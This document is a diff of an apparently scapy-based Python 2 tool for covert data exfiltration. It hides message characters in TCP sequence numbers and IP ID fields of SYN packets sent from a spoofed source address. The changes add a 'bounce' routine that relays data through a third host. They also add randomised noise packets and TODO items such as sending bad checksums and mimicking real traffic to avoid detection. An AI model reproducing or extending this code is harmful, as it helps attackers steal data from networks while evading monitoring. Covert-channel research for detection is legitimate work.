@@ -19,7 +19,7 @@ The sequence numbers are converted to ASCII by dividing by 16777216 which is a
 representation of 65536*256. [1] see README
 
 TODO:
-+ add an end-of-message indicator, ttl=60
+- change end-of-message indicator, win=1337
 - add try, except where appropriate
 - add mode [demo, live]
   demo mode will send packets immediately
@@ -29,6 +29,7 @@ TODO:
 - Add dummy packet data to mimic real traffic. (should we bother?)
 - Add TODOs to the issue queue on github.
 - Add more tests, other than convert TCP/IP channels
+- Send bad checksums (could help prevent responses to our SYN packets)
 
 Questions:
 - Why not bounce off DNS server(s) ?
@@ -196,24 +197,22 @@ def trim_message(message):
 def add_n0ise_iseq(i):
     print '[*] adding n0ise to iseq..'
     y = exfilArray[i]
-    # Add some randomness for schlitz n giggles
+    # Add some randomness
     randy = random.randint(-9999999, 9999999)  # too large will produce error
     pkt.seq = y + randy
     # Signal noisy packet
     pkt.window = int(8182) - random.randint(23, 275)
-    pkt.ttl = 128
     send(pkt)
 
 
 def add_n0ise_ipid(i):
     print '[*] adding n0ise to IPID..'
     y = exfilArray[i]
-    # Add some randomness for schlitz n giggles
+    # Add some randomness
     randy = random.randint(-999, 999)  # too large will produce error
     pkt.seq = y + randy
     # Signal noisy packet
     pkt.window = int(8182) - random.randint(23, 275)
-    pkt.ttl = 128
     send(pkt)
 
 
@@ -227,7 +226,6 @@ def exfil_ipid():
         if i == msglen:
             print '[*] EOM'
         add_n0ise_ipid(i)
-        pkt.ttl = 68
         pkt.id = exfilArray[i]
         time.sleep(0.4)
         send(pkt)
@@ -242,7 +240,6 @@ def exfil_iseq():
     for c in exfilArray:
         add_n0ise_iseq(i)
         pkt.window = k
-        pkt.ttl = 64
         pkt.seq = exfilArray[i]
         # slow our roll
         time.sleep(0.4)
@@ -253,6 +250,18 @@ def exfil_iseq():
 
 def exfil_bounce():
     print '[*] Attempting Ack sequence number bounce exfil..'
+    i = 0
+    k = 8192
+    for c in exfilArray:
+        # Can we use exfil_iseq instead.. by creating the packet with the
+        # appropriate header fields set?
+        add_n0ise_iseq(i)
+        pkt.window = k
+        pkt.seq = exfilArray[i]
+        time.sleep(0.4)
+        send(pkt)
+        i += 1
+    send_eom()
 
 
 # This function sends interface details for interfaces of interest, AF_INET
@@ -319,13 +328,7 @@ print '[*] Sent using IPID: %s' % message
 
 # exfilArray = []
 # ====
-#print '[*] Getting ready to send network interface details'
-#print '[*] Resetting message and exfilArray'
-#
-# message = ''
-# exfilArray = []
-# pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S') # reset our packet
-#
-# FIXME: something was messing up.. seems to work OK now.. the try/except in
-#        the server code seems to have fixed the issue.
-# send_iface()
+
+
+# ==== use bounce host
+
